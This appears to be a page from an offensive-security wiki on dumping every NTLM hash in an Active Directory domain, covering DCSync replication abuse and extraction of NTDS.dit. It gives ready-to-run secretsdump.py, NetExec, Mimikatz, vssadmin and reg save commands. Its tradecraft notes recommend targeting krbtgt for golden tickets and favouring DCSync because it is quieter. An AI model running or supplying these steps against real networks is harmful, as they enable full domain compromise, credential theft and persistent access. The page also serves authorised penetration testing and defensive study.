---
title: "NTDS and DCSync: extracting every account hash in the domain"
description: "Obtaining the NTLM hashes of all domain accounts, including krbtgt, by extracting the NTDS.dit database on a domain controller or by abusing directory replication (DCSync) from any host holding the replication right."
keywords:
  - NTDS.dit
  - DCSync
  - DRSUAPI
  - krbtgt
  - domain hashes
---

# NTDS and DCSync

The `NTDS.dit` database on every domain controller holds the NTLM hash of **every** account in the domain, including the `krbtgt` account whose hash signs all Kerberos tickets. Obtaining it is effectively full domain compromise: it enables pass-the-hash as any user and golden-ticket forgery. There are two ways to get it, one requiring access to a DC and one requiring only a specific replication permission.

## DCSync (replication abuse)

A domain controller replicates directory changes, including secrets, over the **DRSUAPI** protocol. Any principal granted the extended rights **`DS-Replication-Get-Changes`** and **`DS-Replication-Get-Changes-All`** can *ask* a DC to replicate account secrets to it, which looks like normal DC-to-DC traffic and needs no code on the DC. This is **DCSync**:

```bash
# Impacket: pull one account, or the whole domain
secretsdump.py -just-dc-user krbtgt 'EXAMPLE/admin:password@<dc>'
secretsdump.py -just-dc 'EXAMPLE/admin:password@<dc>'

# NetExec
nxc smb <dc> -u admin -p pass --ntds

# Mimikatz, on-host
lsadump::dcsync /domain:example.local /user:krbtgt
```

Domain Admins, Enterprise Admins, and domain controllers hold these rights by default, but the attack's real power is when a **non-admin** principal has been granted them (directly or through a writable DACL), turning an ordinary account into a domain-secret extractor.

## Extracting NTDS.dit directly

With access to a DC (or a backup), extract the database and the SYSTEM hive that holds its encryption key:

```
# Create a shadow copy to read the locked database, then parse offline
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\...\Windows\NTDS\NTDS.dit  &  reg save HKLM\SYSTEM system.save
secretsdump.py -ntds NTDS.dit -system system.save LOCAL

# ntdsutil "IFM" media creation produces the same files
```

## Exploitation notes

- The `krbtgt` hash is the crown jewel: it signs every ticket, so possessing it enables golden-ticket forgery and domain-wide persistence. Extract it specifically even when a full dump is noisy.
- Prefer DCSync over touching the DC filesystem; it is quieter and needs only the replication right, which is exactly why hunting for non-DA principals with that right (see [ACL enumeration](../../enumeration/acl-enumeration.md)) is worthwhile.
- The dump includes historical hashes and, with `-just-dc`, the Kerberos AES keys; keep the AES keys for pass-the-key and ticket forgery.

## Tools

- **secretsdump.py** (Impacket): DCSync (`-just-dc`) and offline NTDS parsing.
- **NetExec (nxc) --ntds**: domain hash dump.
- **Mimikatz** (`lsadump::dcsync`): on-host replication pull.

## References

- The Hacker Recipes: DCSync and NTDS secrets
- Microsoft: directory replication (DRSUAPI) and NTDS
